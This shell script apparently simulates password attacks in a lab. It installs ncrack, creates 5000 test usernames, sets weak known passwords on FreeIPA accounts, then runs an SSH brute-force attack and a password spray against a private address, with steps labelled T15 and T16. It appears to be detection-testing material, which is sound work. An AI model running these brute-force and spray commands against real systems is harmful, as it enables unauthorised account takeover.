#!/bin/sh

echo "Starting Password Testing..."

exec 3>&1 4>&2
trap 'exec 2>&4 1>&3' 0 1 2 3
exec 1>/root/results-password-attacks.log 2>&1

echo "[$(date)] T16 Password Spray Start"

echo "[$(date)] Starting Password Testing"

sleep 5

echo "[$(date)] Installing ncrack"
yum install -y epel-release
yum install -y ncrack
sleep 5
echo "[$(date)] ncrack Installed"

echo "[$(date)] Creating 5000 user accounts..."
for i in `seq 1 5000`;
do
    echo tuser$i >> users.txt
done

echo "[$(date)] Setting known password for tuser10"
#create known password for brute force list
echo 'Pass1234!' | kinit admin
sleep 2
echo 'cooper1' | echo 'cooper1' | ipa user-mod tuser10 --password
echo 'Spring2019' | echo 'Spring2019' | ipa user-mod tuser20 --password
#echo "$(ipa user-mod tuser10 --random | grep "Random password"| cut -d" " -f5)"

echo "[$(date)] T15 Brute-Force Guessing Start"
ncrack -p 22 --user tuser10 -P 10k_most_common.txt 192.168.1.203
sleep 5
echo "[$(date)] T15 Brute-Force Guessing End"

sleep 5

echo "[$(date)] T16 Password Spray Start"
ncrack -p 22 -U users.txt --pass Spring2019 192.168.1.203
sleep 5
echo "[$(date)] T16 Password Spray End"

sleep 5
echo "[$(date)] Password Testing Complete"
